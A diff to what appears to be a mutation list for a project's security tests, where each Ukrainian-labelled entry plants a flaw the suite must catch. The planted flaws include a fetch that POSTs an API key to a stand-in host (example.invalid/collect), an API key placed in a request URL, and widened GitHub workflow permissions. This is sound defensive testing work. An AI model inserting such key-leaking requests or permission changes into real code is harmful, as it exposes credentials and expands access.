@@ -1317,7 +1317,7 @@ const ПІДСАДКИ = [
     файл: `reel-voice.mjs`,
     було: `:generateContent\`,`,
     стало: `:generateContent?key=\${key}\`,`,
-    стереже: `reel-voice: ключа немає в адресі запиту`,
+    стереже: `reel-voice: ключа немає в жодній адресі`,
     сюїта: 'tests-security.mjs',
   },
   {
@@ -1359,8 +1359,14 @@ const ПІДСАДКИ = [
     імя: `розклад новин закоментовано`,
     файл: `../.github/workflows/news.yml`,
     було: `  schedule:
+    # кожні 3 години о :37 — непопулярна хвилина, GitHub менше запізнюється;
+    # раніше кожні 2 години (звіт health 28.09: news — найбільше запусків)
+    - cron: '37 */3 * * *'
 `,
     стало: `  # schedule:
+  # # кожні 3 години о :37 — непопулярна хвилина, GitHub менше запізнюється;
+  # # раніше кожні 2 години (звіт health 28.09: news — найбільше запусків)
+  # - cron: '37 */3 * * *'
 `,
     стереже: `news.yml: не частіше разу на 3 години`,
     сюїта: 'tests-security.mjs',
@@ -1371,6 +1377,45 @@ const ПІДСАДКИ = [
     було: `Токен Instagram не продовжився — потрібна ручна переавторизація (скажи Клоду «онови токен інстаграма»)."`,
     стало: `Токен Instagram не продовжився — потрібна ручна переавторизація (скажи Клоду «онови токен інстаграма»)." -d chat_id=""`,
     стереже: `ig-refresh.yml: кожен chat_id — це "$CHAT"`,
+    сюїта: 'tests-security.mjs',
+  },  {
+    імя: `ig-refresh: право в ключі в лапках`,
+    файл: `../.github/workflows/ig-refresh.yml`,
+    було: `permissions: {}
+`,
+    стало: `permissions:
+  'contents': write
+`,
+    стереже: `ig-refresh.yml: явно без прав токена`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `reel-voice: зайвий запит із ключем до чужої адреси`,
+    файл: `reel-voice.mjs`,
+    було: `  const res = await fetch(
+`,
+    стало: `  await fetch('https://example.invalid/collect', { method: 'POST', body: key });
+  const res = await fetch(
+`,
+    стереже: `reel-voice: рівно один запит — і той пішов`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `ig-refresh: CHAT числом, vars лише в коментарі`,
+    файл: `../.github/workflows/ig-refresh.yml`,
+    було: `          CHAT: \${{ vars.TG_OWNER_CHAT }}
+`,
+    стало: `          CHAT: '-1001234567890' # CHAT: \${{ vars.TG_OWNER_CHAT }}
+`,
+    стереже: `ig-refresh.yml: CHAT — саме vars.TG_OWNER_CHAT`,
+    сюїта: 'tests-security.mjs',
+  },
+  {
+    імя: `tg-post: діапазон годин замість кроку`,
+    файл: `../.github/workflows/tg-post.yml`,
+    було: `    - cron: '47 */4 * * *'`,
+    стало: `    - cron: '47 0-23/4,1-23 * * *'`,
+    стереже: `tg-post.yml: 6 запусків на добу (стеля 4 пости — у telegram-news.mjs)`,
     сюїта: 'tests-security.mjs',
   },
 ];
